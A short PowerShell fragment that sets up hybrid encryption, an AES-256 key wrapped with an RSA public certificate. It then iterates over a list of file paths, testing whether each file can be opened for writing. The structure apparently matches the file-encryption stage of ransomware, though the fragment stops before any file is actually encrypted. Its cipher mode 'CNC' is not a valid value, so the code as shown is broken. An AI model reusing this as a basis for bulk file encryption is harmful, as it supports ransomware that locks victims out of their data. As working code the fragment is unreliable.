#Encryption

$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ($strPublicCert)
[System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography")
$AesProvider = New-Object System.Security.Cryptography.AesManaged
$AesProvider.KeySize = 256
$AesProvider.BlockSize = 128
$AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CNC
$KeyFormatter = New-Object System.Security.Cryptography.RSAOAEPKeyExchangeFormatter ($Cert.PublicKey.Key)
[Byte[]]$KeyEncrypted = $KeyFormatter.CreateKeyExchange($AesProvider.Key,$AesProvider.GetType())
[Byte[]]$LenKey = [System.BitConverter]::GetBytes($KeyEncrypted.Length)
[Byte[]]$LenIV = [System.BitConverter]::GetBytes($AesProvider.IV.Length)

Get-Content -Encoding Unicode $FileListPath | Select-Object -Index ($StartLine..$EndLine) | ForEach-Object {
	[System.GC]::Collect()

	### checks
	try {
		if (Test-Path -Path $_ -PathType Leaf) {
			$line = Get-Item ($_) 
			[io.file]::OpenWrite($line).close()
		}
	} catch {}
}
